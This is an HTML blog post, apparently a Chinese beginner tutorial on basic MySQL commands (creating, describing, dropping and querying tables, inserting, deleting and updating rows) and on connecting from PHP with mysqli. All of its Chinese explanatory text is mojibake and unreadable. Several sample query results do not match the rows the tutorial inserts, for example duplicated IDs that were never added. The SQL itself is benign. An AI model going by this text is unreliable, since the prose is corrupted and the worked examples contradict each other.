<h5 id="3-æ˜¾ç¤ºåˆ›å»ºè¡¨"><a href="#3-æ˜¾ç¤ºåˆ›å»ºè¡¨" class="headerlink" title="3.æ˜¾ç¤ºåˆ›å»ºè¡¨"></a>3.æ˜¾ç¤ºåˆ›å»ºè¡¨</h5><p><strong>show create table XX(è¡¨å);</strong><br><strong>show create table XX(è¡¨å) \G;</strong></p>
<p>ä¸Šé¢ä¸¤æ®µä»£ç éƒ½æ˜¯æ˜¾ç¤ºåˆ›å»ºè¡¨ï¼Œåªä¸è¿‡æ˜¾ç¤ºçš„æ ·å¼ä¸åŒï¼Œéšæ„é€‰æ‹©ä¸€ç§å³å¯</p>
<p>ä¸Šé¢é‚£ç§ä¼šæ˜¾ç¤º</p>
<p>+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+</p>
<table>
<thead>
<tr>
<th align="left">Table</th>
<th align="left">Create Table</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">stu</td>
<td align="left">CREATE TABLE <code>stu</code> (</td>
</tr>
<tr>
<td align="left"><code>id</code> varchar(20) DEFAULT NULL,</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>name</code> varchar(10) DEFAULT NULL,</td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><code>score</code> int(11) DEFAULT NULL</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">) ENGINE=InnoDB DEFAULT CHARSET=utf8</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">+â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“+</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">1 row in set (0.00 sec)</td>
<td align="left"></td>
</tr>
</tbody></table>
<p>ä¸‹é¢é‚£ç§ä¼šæ˜¾ç¤º</p>
<p><strong><em>*</em>*****************\</strong>*** 1. row <strong><em>*</em>*****************\</strong>***<br>Table: stu<br>Create Table: CREATE TABLE <code>stu</code> (<br><code>id</code> varchar(20) DEFAULT NULL,<br><code>name</code> varchar(10) DEFAULT NULL,<br><code>score</code> int(11) DEFAULT NULL<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8<br>1 row in set (0.00 sec)</p>
<p><strong>ERROR:</strong><br><strong>No query specified</strong></p>
<p>##è®°å¾—ç™¾åº¦ERRORï¼›</p>
<h5 id="4-æ˜¾ç¤ºè¡¨çš„ç»“æ„"><a href="#4-æ˜¾ç¤ºè¡¨çš„ç»“æ„" class="headerlink" title="4.æ˜¾ç¤ºè¡¨çš„ç»“æ„"></a>4.æ˜¾ç¤ºè¡¨çš„ç»“æ„</h5><p><strong>describe(æˆ–desc) XX(è¡¨å);</strong></p>
<p>å›è½¦ä¹‹åä¼šæ˜¾ç¤ºåˆšåˆšæˆ‘åˆ›å»ºçš„è¡¨çš„ç»“æ„</p>
<p>+â€”â€”-+â€”â€”â€”â€”-+â€”â€”+â€”â€“+â€”â€”â€”+â€”â€”-+<br>| Field | Type | Null | Key | Default | Extra |<br>+â€”â€”-+â€”â€”â€”â€”-+â€”â€”+â€”â€“+â€”â€”â€”+â€”â€”-+<br>| id | varchar(20) | YES | | NULL | |<br>| name | varchar(10) | YES | | NULL | |<br>| score | int(11) | YES | | NULL | |<br>+â€”â€”-+â€”â€”â€”â€”-+â€”â€”+â€”â€“+â€”â€”â€”+â€”â€”-+<br>3 rows in set (0.00 sec)</p>
<p>è§£é‡Šæ¯ä¸ªè¡¨å¤´çš„å«ä¹‰</p>
<p>å…¶ä¸­ id ,name,scoreéƒ½æ˜¯å­—æ®µï¼Œç„¶åvarcharä»€ä¹ˆçš„éƒ½æ˜¯å­—æ®µçš„å†…å‹ã€‚</p>
<p>å› ä¸ºç°åœ¨ä»€ä¹ˆéƒ½æ²¡æœ‰å†™è¿›å»ï¼Œæ‰€ä»¥æ˜¯ç©ºçš„ã€‚keyæ˜¯è¯´æ˜¯ä¸æ˜¯ä¸»é”®ã€‚</p>
<h5 id="5-åˆ é™¤è¡¨"><a href="#5-åˆ é™¤è¡¨" class="headerlink" title="5.åˆ é™¤è¡¨"></a>5.åˆ é™¤è¡¨</h5><p><strong>drop table XX(è¡¨å);</strong><br>*<em>drop table XX,XX,XXâ€¦â€¦;</em></p>
<p>åœ¨è¿™é‡Œå› ä¸ºåé¢è¿˜è¦ç”¨åˆ°è¡¨ï¼Œæˆ‘ä»¬åªåˆ›å»ºäº†ä¸€ä¸ªè¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å†åˆ›å»ºä¸€ä¸ªè¡¨ï¼Œ</p>
<p><strong>My</strong>SQL [qq1]&gt; create table stu1(<br><strong>-&gt; id varchar(20),</strong><br><strong>-&gt; name varchar(10),</strong><br><strong>-&gt; score int</strong><br>-&gt; );</p>
<p>æ¥æ¼”ç¤ºåˆ é™¤</p>
<p>åˆ›å»ºå¥½äº†ä¹‹åæŸ¥çœ‹ä¸€ä¸‹è¡¨çš„å¤šå°‘ï¼ˆshow tables;ï¼‰ã€‚</p>
<p>å›è½¦ä¹‹åæ˜¾ç¤º</p>
<p><strong>Query OK, 0 rows affected (0.04 sec)</strong> #è¡¨ç¤ºåˆ é™¤æˆåŠŸã€‚</p>
<p>æˆ‘ä»¬å†æ¥æŸ¥çœ‹ä¸€ä¸‹è¡¨ã€‚å‘ç°å°‘äº†ä¸€ä¸ªï¼Œè¡¨ç¤ºåˆ é™¤æˆåŠŸã€‚</p>
<h3 id="æ•°æ®çš„åŸºæœ¬æ“ä½œ"><a href="#æ•°æ®çš„åŸºæœ¬æ“ä½œ" class="headerlink" title="æ•°æ®çš„åŸºæœ¬æ“ä½œ"></a>æ•°æ®çš„åŸºæœ¬æ“ä½œ</h3><p>æ•°æ®çš„æ“ä½œç®—æ˜¯æ•´ä¸ªMySQLä¸­æœ€å¤æ‚çš„éƒ¨åˆ†ï¼Œè™½ç„¶æ¦‚æ‹¬èµ·æ¥æ— éå°±æ˜¯â€œå¢åˆ æŸ¥æ”¹â€ï¼Œä½†æ¯ä¸€é¡¹åº•ä¸‹åŒ…å«çš„å†…å®¹éå¸¸ä¹‹å¤šï¼Œæˆ‘æ¯”è¾ƒèœï¼Œæ‰€ä»¥å°½åŠ›è€Œä¸ºã€‚</p>
<h4 id="1-æ’å…¥æ•°æ®"><a href="#1-æ’å…¥æ•°æ®" class="headerlink" title="1.æ’å…¥æ•°æ®"></a>1.æ’å…¥æ•°æ®</h4><p>è¿™ä¸ªè¦åœ¨è¡¨çš„åº•ä¸‹å®ç°ï¼Œ<strong>æ‰€ä»¥è¦å…ˆæœ‰ä¸ªè¡¨</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into XXï¼ˆè¡¨åï¼‰ (å­—æ®µ1,å­—æ®µ2,å­—æ®µ3......) values (å€¼1,å€¼2,å€¼3.......);</span><br></pre></td></tr></table></figure>
<p>æ¯”å¦‚åœ¨è‡ªå·±çš„stuè¡¨ä¸­æ’å…¥ä¸€äº›ä¿¡æ¯</p>
<p><strong>insert into stu (id,name,score) values(â€œ201801â€,â€æŸæŸâ€,90);</strong></p>
<p>åƒä¸‡è¦æ³¨æ„ä¸è¦å†™å…¥ä¸­æ–‡ç¬¦å·ï¼Œä¸ç„¶ä¼šæŠ¥é”™ï¼Œåƒä¸‡åƒä¸‡ã€‚</p>
<p>å›è½¦ä¹‹åæœ‰ä¸‹é¢ä¸€æ®µä»£ç ï¼Œæ˜¾ç¤ºæˆåŠŸæ’å…¥æ•°æ®</p>
<p><strong>Query OK, 1 row affected (0.00 sec)</strong></p>
<p>æˆ‘ä»¬å†æ’å…¥å‡ æ¡ä¿¡æ¯</p>
<p><strong>insert into stu (id,name,score) values(â€œ201820â€,â€å˜¿å˜¿â€,70);</strong></p>
<p>insert into stu (id,name,score) values(â€œ201830â€,â€lalaâ€,90);</p>
<p>ç„¶åçœ‹ä¸‹é¢çš„æŸ¥è¯¢æ•°æ®</p>
<h4 id="2-æŸ¥è¯¢æ•°æ®"><a href="#2-æŸ¥è¯¢æ•°æ®" class="headerlink" title="2.æŸ¥è¯¢æ•°æ®"></a>2.æŸ¥è¯¢æ•°æ®</h4><p>è®©å¤§å®¶çœ‹ä¸€ä¸‹æ’å…¥æ•°æ®ä¹‹åï¼Œè¡¨å†…å˜æˆä»€ä¹ˆæ ·äº†ï¼Œ</p>
<p>é¦–å…ˆç»™å¤§å®¶ä»‹ç»ä¸€ä¸ªçŸ¥è¯†ç‚¹â€”â€”è¿ç®—ç¬¦<br>æ¯”è¾ƒè¿ç®—ç¬¦ &gt;ã€&gt;=ã€&lt;ã€&lt;=ã€=ï¼ˆæ¯”è¾ƒå’Œèµ‹å€¼éƒ½æ˜¯â€=â€ï¼‰ã€&lt;&gt;ï¼ˆä¸ç­‰äºï¼‰</p>
<p>é€»è¾‘è¿ç®—ç¬¦ éï¼ˆnotï¼‰ andï¼ˆä¸ï¼‰orï¼ˆæˆ–ï¼‰</p>
<p>å’ŒCè¯­è¨€å·®ä¸å¤šï¼Œä½†æ˜¯æœ‰çš„æœ‰åŒºåˆ«ï¼Œä¸è¦æ··æ·†ã€‚</p>
<h6 id="1ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢çš„æ•°æ®"><a href="#1ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢çš„æ•°æ®" class="headerlink" title="1ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢çš„æ•°æ®"></a>1ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢çš„æ•°æ®</h6><p><strong>select * from XXï¼ˆè¡¨åï¼‰;</strong></p>
<p>æˆ‘ä»¬ æ¥æŸ¥è¯¢åˆšåˆšåˆ›å»ºçš„è¡¨çš„æ•°æ®</p>
<p><strong>select * from stu;</strong></p>
<p>å›è½¦æ˜¾ç¤ºå†…å®¹</p>
<p>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| id | name | score |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| 201801 | æŸæŸ | 90 |<br>| 201810 | å•¥å•¥ | 80 |<br>| 201810 | å•¥å•¥ | 80 |<br>| 201820 | å˜¿å˜¿ | 70 |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>4 rows in set (0.00 sec)</p>
<h6 id="2ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢æŸå­—æ®µ-çš„æ‰€æœ‰æ•°æ®"><a href="#2ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢æŸå­—æ®µ-çš„æ‰€æœ‰æ•°æ®" class="headerlink" title="2ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢æŸå­—æ®µ çš„æ‰€æœ‰æ•°æ®"></a>2ã€æŸ¥è¯¢ä¸€ä¸ªè¡¨é‡Œé¢æŸå­—æ®µ çš„æ‰€æœ‰æ•°æ®</h6><p>select å­—æ®µ1,å­—æ®µ2,å­—æ®µ3â€¦â€¦ï¼ˆæˆ–ç”¨â€*â€ä»£æ›¿æ‰€æœ‰å­—æ®µï¼‰ from XXï¼ˆè¡¨åï¼‰;</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬æŸ¥è¯¢â€œidâ€å­—æ®µåº•ä¸‹æ‰€æœ‰çš„æ•°æ®ï¼Œé‚£ä¹ˆâ€idâ€œä¸‹æœ‰å“ªäº›æ•°æ®ï¼Œå°±ä¼šå±•ç°å‡ºæ¥</p>
<p><strong>select id from stu;</strong></p>
<p>å›è½¦æ˜¾ç¤ºè¿™ä¸ªè¡¨é‡Œé¢idå­—æ®µä¸‹çš„æ‰€æœ‰çš„æ•°æ®</p>
<p>+â€”â€”â€“+<br>| id |<br>+â€”â€”â€“+<br>| 201801 |<br>| 201810 |<br>| 201810 |<br>| 201820 |<br>+â€”â€”â€“+<br>4 rows in set (0.00 sec)</p>
<h6 id="3-æˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®æ¡ä»¶æ¥æŸ¥è¯¢ä¿¡æ¯"><a href="#3-æˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®æ¡ä»¶æ¥æŸ¥è¯¢ä¿¡æ¯" class="headerlink" title="3.æˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®æ¡ä»¶æ¥æŸ¥è¯¢ä¿¡æ¯"></a>3.æˆ‘ä»¬ä¹Ÿå¯ä»¥æ ¹æ®æ¡ä»¶æ¥æŸ¥è¯¢ä¿¡æ¯</h6><p><strong>select * from XXï¼ˆè¡¨åï¼‰where å­—æ®µ1 = å€¼1 and å­—æ®µ2 = å€¼2 and â€¦â€¦;</strong></p>
<p>ä¾‹å¦‚æˆ‘ä»¬æ¥æŸ¥è¯¢stué‡Œé¢nameæ˜¯æŸæŸçš„å¹¶ä¸”scoreæ˜¯90çš„äºº</p>
<p><strong>select * from stu where score =90 and name=â€æŸæŸâ€;</strong></p>
<p>å›è½¦æ˜¾ç¤ºå†…å®¹</p>
<p>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| id | name | score |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| 201801 | æŸæŸ | 90 |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>1 row in set (0.02 sec)</p>
<h6 id="4-æˆ‘ä»¬ä¹Ÿå¯ä»¥æœç´¢"><a href="#4-æˆ‘ä»¬ä¹Ÿå¯ä»¥æœç´¢" class="headerlink" title="4.æˆ‘ä»¬ä¹Ÿå¯ä»¥æœç´¢"></a>4.æˆ‘ä»¬ä¹Ÿå¯ä»¥æœç´¢</h6><p><strong>select * from stu where score &gt; 90 or score &lt; 60;</strong></p>
<p>è¿™ä¸ªå°±æ˜¯æŸ¥æ‰¾è¡¨ä¸­åˆ†æ•°åœ¨90ä»¥ä¸Šæˆ–è€…60ä»¥ä¸‹çš„äºº</p>
<p>è¦æ˜¯æ²¡æœ‰çš„è¯ï¼Œå°±ä¼šæ˜¾ç¤ºè¿™æ®µä¿¡æ¯ã€‚</p>
<p><strong>Empty set (0.00 sec)</strong></p>
<p>è¿™ä¸ªå°±æ˜¯æŸ¥æ‰¾è¡¨ä¸­åˆ†æ•°åœ¨80ä»¥ä¸Šæˆ–è€…60ä»¥ä¸‹çš„äºº</p>
<p>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| id | name | score |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| 201801 | æŸæŸ | 90 |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>1 row in set (0.00 sec)</p>
<h6 id="5-å¯¹æ•°æ®è¿›è¡Œæ’åº"><a href="#5-å¯¹æ•°æ®è¿›è¡Œæ’åº" class="headerlink" title="5.å¯¹æ•°æ®è¿›è¡Œæ’åº"></a>5.å¯¹æ•°æ®è¿›è¡Œæ’åº</h6><p><strong>select * from XXï¼ˆè¡¨åï¼‰ order by å­—æ®µx asc;ï¼ˆé»˜è®¤å°±æ˜¯å‡åºï¼Œä½â€”â€”â€”â€”é«˜ï¼‰</strong></p>
<p>è¿™é‡Œæ¼”ç¤ºä¸€ä¸ªæŒ‰ç…§idåºå·æ¥æ’åºã€‚</p>
<p><strong>select * from stu order by id asc;</strong></p>
<p>å›è½¦ä¹‹åæ˜¾ç¤º</p>
<p>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| id | name | score |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| 201801 | æŸæŸ | 90 |<br>| 201810 | å•¥å•¥ | 80 |<br>| 201810 | å•¥å•¥ | 80 |<br>| 201820 | å˜¿å˜¿ | 70 |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+</p>
<p><strong>select * from XXï¼ˆè¡¨åï¼‰ order by å­—æ®µx desc;</strong> ï¼ˆé«˜â€”â€”â€”ä½ï¼‰</p>
<p><strong>select * from XXï¼ˆè¡¨åï¼‰ where å­—æ®µx = å€¼x oreder by å­—æ®µx asc(desc);</strong> ï¼ˆæŒ‰ç…§æŸç§æ¡ä»¶æ’åºï¼‰</p>
<p><strong>select * from XXï¼ˆè¡¨åï¼‰ limit n;</strong> ï¼ˆå–å‰næ¡æ•°æ®ï¼‰</p>
<p>ä¸‹é¢æ¼”ç¤ºä¸€ä¸ªå–å‰ä¸¤æ¡æ•°æ®</p>
<p><strong>select * from stu limit 2;</strong></p>
<p>å›è½¦ä¹‹åæ˜¾ç¤º</p>
<p>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| id | name | score |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| 201801 | æŸæŸ | 90 |<br>| 201810 | å•¥å•¥ | 80 |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>2 rows in set (0.00 sec)</p>
<p>å…¶ä»–çš„å°±ä¸ä¸¾ä¾‹äº†ã€‚è‡ªå·±å¯ä»¥è¯•ä¸€è¯•ã€‚</p>
<p><strong>select * from XXï¼ˆè¡¨åï¼‰ limit n,m;</strong> ï¼ˆä»ç¬¬næ¡å¼€å§‹å–mæ¡æ•°æ® ï¼‰</p>
<p>*<em>select \</em> from XXï¼ˆè¡¨åï¼‰ order by å­—æ®µx asc(desc) limit n;**ï¼ˆå–æŸç§æ’åºä¸‹çš„å‰næ¡æ•°æ®ï¼‰</p>
<h4 id="3-åˆ é™¤æ•°æ®"><a href="#3-åˆ é™¤æ•°æ®" class="headerlink" title="3.åˆ é™¤æ•°æ®"></a>3.åˆ é™¤æ•°æ®</h4><p><strong>delete from XXï¼ˆè¡¨åï¼‰ where å­—æ®µx = å€¼x;</strong></p>
<p>ä¸¾ä¾‹è¯´æ˜</p>
<p><strong>delete from stu where id=201801;</strong></p>
<p>å›è½¦ä¹‹åï¼Œåœ¨æŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œçœ‹æ˜¯ä¸æ˜¯å°‘äº†ç¬¬ä¸€æ¡ä¿¡æ¯ï¼Œ</p>
<p><strong>select * from stu;</strong></p>
<p>å›è½¦ä¹‹åå‘ç°å°‘äº†å“ªä¸€è¡Œid=201801çš„æ•°æ®ã€‚è¿™æ ·å°±åˆ é™¤æ•°æ®æˆåŠŸäº†ã€‚</p>
<p>ç„¶ååœ¨ä½¿ç”¨select * from stu;</p>
<p>æ¥çœ‹çœ‹è‡ªå·±æ˜¯å¦çœŸçš„åˆ é™¤æˆåŠŸäº†ï¼Œ</p>
<p>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| id | name | score |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>| 201810 | å•¥å•¥ | 80 |<br>| 201810 | å•¥å•¥ | 80 |<br>| 201820 | å˜¿å˜¿ | 70 |<br>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+<br>3 rows in set (0.01 sec)</p>
<h4 id="4-ä¿®æ”¹æ•°æ®"><a href="#4-ä¿®æ”¹æ•°æ®" class="headerlink" title="4.ä¿®æ”¹æ•°æ®"></a>4.ä¿®æ”¹æ•°æ®</h4><p><strong>update XXï¼ˆè¡¨åï¼‰ set å­—æ®µ1 = å€¼1,å­—æ®µ2 = å€¼2 where æ¡ä»¶;</strong><br><strong>update XXï¼ˆè¡¨åï¼‰ set å­—æ®µ1 = å€¼1;</strong></p>
<p>ä¸‹é¢ä¸€æ¡çš„ä½œç”¨æ˜¯ä¿®æ”¹æŸä¸€å­—æ®µçš„æ‰€æœ‰å€¼ï¼Œæ‰€ä»¥ä¸éœ€è¦åŠ æ¡ä»¶ã€‚</p>
<p>å®ä¾‹</p>
<p><strong>update stu set id = 201710,name = â€œå•¦å•¦â€ where id = 201810 ;</strong></p>
<p>å›è½¦ä¹‹åæ˜¾ç¤º</p>
<p><strong>Query OK, 2 rows affected (0.01 sec)</strong><br><strong>Rows matched: 2 Changed: 2 Warnings: 0</strong></p>
<p>è¡¨ç¤ºä¿®æ”¹æˆåŠŸã€‚</p>
<p>ç„¶åæˆ‘ä»¬å†æ¥æŸ¥è¯¢ä¸€ä¸‹è¡¨çš„ä¿¡æ¯ã€‚</p>
<p><strong>select * from stu;</strong></p>
<p>å›è½¦ä¹‹åæ˜¾ç¤º</p>
<p><strong>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+</strong></p>
<table>
<thead>
<tr>
<th align="left"><strong>id</strong></th>
<th align="left"><strong>name</strong></th>
<th align="left"><strong>score</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><strong>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+</strong></td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left"><strong>201710</strong></th>
<th align="left"><strong>å•¦å•¦</strong></th>
<th align="left"><strong>80</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><strong>201710</strong></td>
<td align="left"><strong>å•¦å•¦</strong></td>
<td align="left"><strong>80</strong></td>
</tr>
<tr>
<td align="left">â€”â€”â€”-</td>
<td align="left">â€”â€”â€“</td>
<td align="left">â€”â€”</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><strong>201820</strong></td>
<td align="left"><strong>å˜¿å˜¿</strong></td>
<td align="left"><strong>70</strong></td>
</tr>
<tr>
<td align="left">â€”â€”â€”-</td>
<td align="left">â€”â€”â€“</td>
<td align="left">â€”â€”</td>
</tr>
<tr>
<td align="left"></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left"><strong>+â€”â€”â€“+â€”â€”â€“+â€”â€”-+</strong></td>
<td align="left"></td>
<td align="left"></td>
</tr>
<tr>
<td align="left">3 rows in set (0.00 sec)</td>
<td align="left"></td>
<td align="left"></td>
</tr>
</tbody></table>
<p>æ³¨æ„è¿™é‡Œçš„ç¬¬ä¸€æ¡ä¿¡æ¯ï¼Œå·²ç»æ”¹å˜äº†ã€‚</p>
<h4 id="ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨phpstromä¸­å°è¯•è¿™äº›è¯­å¥ï¼Œçœ‹æ˜¯ä¸æ˜¯ä¸€æ ·çš„ã€‚"><a href="#ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨phpstromä¸­å°è¯•è¿™äº›è¯­å¥ï¼Œçœ‹æ˜¯ä¸æ˜¯ä¸€æ ·çš„ã€‚" class="headerlink" title="ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨phpstromä¸­å°è¯•è¿™äº›è¯­å¥ï¼Œçœ‹æ˜¯ä¸æ˜¯ä¸€æ ·çš„ã€‚"></a>ç„¶åæˆ‘ä»¬å°±å¯ä»¥åœ¨phpstromä¸­å°è¯•è¿™äº›è¯­å¥ï¼Œçœ‹æ˜¯ä¸æ˜¯ä¸€æ ·çš„ã€‚</h4><h3 id="phpéƒ¨åˆ†"><a href="#phpéƒ¨åˆ†" class="headerlink" title="phpéƒ¨åˆ†"></a><strong>phpéƒ¨åˆ†</strong></h3><p><strong>å…¥é—¨</strong></p>
<p>â‘ PHPä¸­çš„å˜é‡ï¼Œå£°æ˜ä¸ä½¿ç”¨ï¼Œå¿…é¡»ä½¿ç”¨$å¼€å¤´ã€‚</p>
<p>â‘¡PHPæ˜¯ä¸€ç§å¼±ç±»å‹è¯­è¨€ï¼Œå˜é‡å…¶å®å¹¶ä¸éœ€è¦å£°æ˜ï¼Œå¯ä»¥ç›´æ¥ç»™å˜é‡èµ‹ä»»ä½•ç±»å‹çš„å€¼ï¼›</p>
<p>â‘¢PHPä¸­å¯ä»¥ä½¿ç”¨è¿ç­‰åŒæ—¶å£°æ˜å¤šä¸ªå˜é‡ã€‚è€Œä¸èƒ½ä½¿ç”¨é€—å·åˆ†éš”ã€‚</p>
<p>egï¼š$num1=$num2=$num3=5;</p>
<p>â‘£å¸¸ç”¨å˜é‡å‡½æ•°ï¼š</p>
<p>unset()ï¼šåˆ é™¤å¹¶é‡Šæ”¾å˜é‡ï¼›</p>
<p>isset()ï¼šæ£€æµ‹å˜é‡æ˜¯å¦è®¾ç½®ï¼›</p>
<p>empty()ï¼šæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºç©ºï¼ˆæœªè®¾ç½®æˆ–å€¼ä¸ºNulléƒ½ç®—ç©ºï¼‰ï¼›</p>
<p>â‘¤å˜é‡çš„å‘½åï¼šåªèƒ½æœ‰å­—æ¯æ•°å­—ä¸‹åˆ’çº¿ç»„æˆï¼Œå¼€å¤´ä¸èƒ½æ˜¯æ•°å­—ã€‚è€Œä¸”ï¼ŒPHPä¸­å˜é‡åŒºåˆ†å¤§å°å†™ï¼ï¼<br>$name,$Nnme,$NAMEéƒ½æ˜¯ä¸åŒå˜é‡ï¼›</p>
<p>ä½†æ˜¯ï¼ŒPHPçš„å†…ç½®å‡½æ•°ä¸åŒºåˆ†å¤§å°å†™ï¼echo EcHoéƒ½æ˜¯æœ‰æ•ˆçš„ã€‚</p>
<h4 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h4><p>è¿™é‡Œé¢æœ‰[ä¸å†ä½¿ç”¨mysql_connect()æ¥è¿æ¥æ•°æ®åº“]çš„è§£é‡Š</p>
<p>å› ä¸ºä»– ä¼šæ˜¾ç¤º <strong>ä¸æ¨èä½¿ç”¨mysqlæ‰©å±•ï¼Œå°†æ¥ä¼šåˆ é™¤å®ƒ</strong></p>
<p>æœ¬æ‰©å±•è‡ª PHP 5.5.0 èµ·å·²åºŸå¼ƒï¼Œå¹¶åœ¨å°†æ¥ä¼šè¢«ç§»é™¤ã€‚åº”ä½¿ç”¨ <a href="http://php.net/manual/zh/book.mysqli.php">MySQLi</a> æˆ– <a href="http://php.net/manual/zh/ref.pdo-mysql.php">PDO_MySQL</a> æ‰©å±•æ¥æ›¿æ¢ä¹‹ã€‚å‚è§ <a href="http://php.net/manual/zh/mysqlinfo.api.choosing.php">MySQLï¼šé€‰æ‹© API</a> æŒ‡å—ä»¥åŠ<a href="http://php.net/manual/zh/faq.databases.php#faq.databases.mysql.deprecated">ç›¸å…³ FAQ</a> ä»¥è·å–æ›´å¤šä¿¡æ¯</p>
<p>è¯¦æƒ…è¯·äº†è§£ä¸‹é¢ã€‚</p>
<p><a href="https://www.cnblogs.com/wangtao_20/p/4823088.html">https://www.cnblogs.com/wangtao_20/p/4823088.html</a></p>
<p>è¿æ¥è§£é‡Šï¼š</p>
<p>mysqli_connect_errno() è¿”å›ä¸€ä¸ªæ•´æ•°ï¼Œæ ‡è¯†è¿æ¥æ•°æ®åº“æ˜¯å¦æˆåŠŸå’Œå„ç§é”™è¯¯çš„æ•°å€¼ã€‚</p>
<p>mysqli_connect_error() è¿”å›è¿æ¥é”™è¯¯ä¿¡æ¯ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€äº›è¿æ¥æƒ…å†µï¼š</p>
<p><strong>mysqli_connect_errno</strong> <strong>mysqli_connect_error</strong></p>
<p>2002 php_network_getaddresses: getaddrinfo failed: ä¸çŸ¥é“è¿™æ ·çš„ä¸»æœºã€‚</p>
<p>1045 Access denied for user â€˜wjjâ€™@â€™localhostâ€™ (using password: YES)</p>
<p>1049 Unknown database â€˜testâ€™</p>
<p>0(è¿æ¥æˆåŠŸ) null</p>
<h5 id="åˆ›å»ºæ•°æ®åº“"><a href="#åˆ›å»ºæ•°æ®åº“" class="headerlink" title="åˆ›å»ºæ•°æ®åº“"></a>åˆ›å»ºæ•°æ®åº“</h5><p>è¯­å¥ï¼š**$sql=â€™CREATE DATABASE aa â€˜;**<br>create databaseå¤§å°å†™éƒ½å¯ä»¥ï¼Œ</p>
<p><strong>PHP ä½¿ç”¨ mysqli_query å‡½æ•°æ¥åˆ›å»ºæˆ–è€…åˆ é™¤ MySQL æ•°æ®åº“ã€‚</strong><br><strong>è¯¥å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåœ¨æ‰§è¡ŒæˆåŠŸæ—¶è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚</strong></p>
<h5 id="åˆ é™¤æ•°æ®åº“"><a href="#åˆ é™¤æ•°æ®åº“" class="headerlink" title="åˆ é™¤æ•°æ®åº“"></a>åˆ é™¤æ•°æ®åº“</h5><p>è¯­å¥ï¼š**$sql=â€™DROP DATABASE aa â€˜;**</p>
